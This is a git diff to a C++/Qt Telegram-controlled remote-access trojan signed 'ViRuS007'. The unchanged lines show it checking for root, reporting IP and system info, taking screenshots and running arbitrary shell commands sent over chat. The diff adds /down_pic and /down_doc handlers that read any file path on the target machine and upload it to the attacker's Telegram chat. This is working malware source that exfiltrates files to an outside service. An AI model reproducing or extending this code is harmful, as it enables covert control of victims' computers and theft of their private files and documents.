@@ -11,6 +11,7 @@
 #include <QVariant>
 #include <QSysInfo>
 #include <QFile>
+#include <QRegularExpression>
 #include "unistd.h"
 
 #include "qttelegrambot.h"
@@ -25,6 +26,13 @@ void newMessage(Telegram::Message message)
     qDebug() << "new message:" << message;
 
     if (bot && message.type == Telegram::Message::TextType) {
+
+        QRegularExpression re("\/down_pic (.*)");
+        QRegularExpression re2("\/down_doc (.*)");
+
+        QRegularExpressionMatch match = re.match(message.string);
+        QRegularExpressionMatch match2 = re2.match(message.string);
+
         if (message.string == "/start") {
             if (getuid()) {
                 bot->sendMessage(message.chat.id, "Hello " + message.from.firstname + " \n\n☠ Bot is online!\nAccess system is Root? :False\n\n Enter /help to get commands and help.");
@@ -37,9 +45,11 @@ void newMessage(Telegram::Message message)
         }
         //Help command
         else if (message.string == "/help") {
-            bot->sendMessage(message.chat.id, "Help:\n"
-                             "  /info => To Get ip and system info\n"
-                             "  /screenShot => Get ScreenShot of system(Just linux)\n\n"
+            bot->sendMessage(message.chat.id, "☠ Help:\n"
+                             "  /info => To Get ip and system info.\n"
+                             "  /screenShot => Get ScreenShot of system(Just linux).\n"
+                             "  /down_pic [ name + path ]   => Get Download picture from system target.\n"
+                             "  /down_doc [ name + path ]   => Get Download document from target system\n\n"
                              "for run shell command just send without `/` and \nRecive result.\n"
                              "Coded By : ViRuS007\n"
                              "Email : virus007@protonmail.com\n"
@@ -75,6 +85,21 @@ void newMessage(Telegram::Message message)
                 qDebug() << "Error to opening file";
                 bot->sendMessage(message.chat.id, "☠ Error To Opening File!");
             }
+        }
+        // Download Picture from target system
+        else if (match.hasMatch()) {
+            QString mached = match.captured(1);
+//            qDebug() << mached;
+            QFile photo(mached);
+            //send to telegram
+            bot->sendPhoto(message.chat.id, &photo);
+        }
+        //send document
+        else if (match2.hasMatch()){
+            QString matched = match2.captured(1);
+            QFile doc(matched);
+            //send to telegram
+            bot->sendDocument(message.chat.id, &doc);
         }
 
         //Else for run shell commands
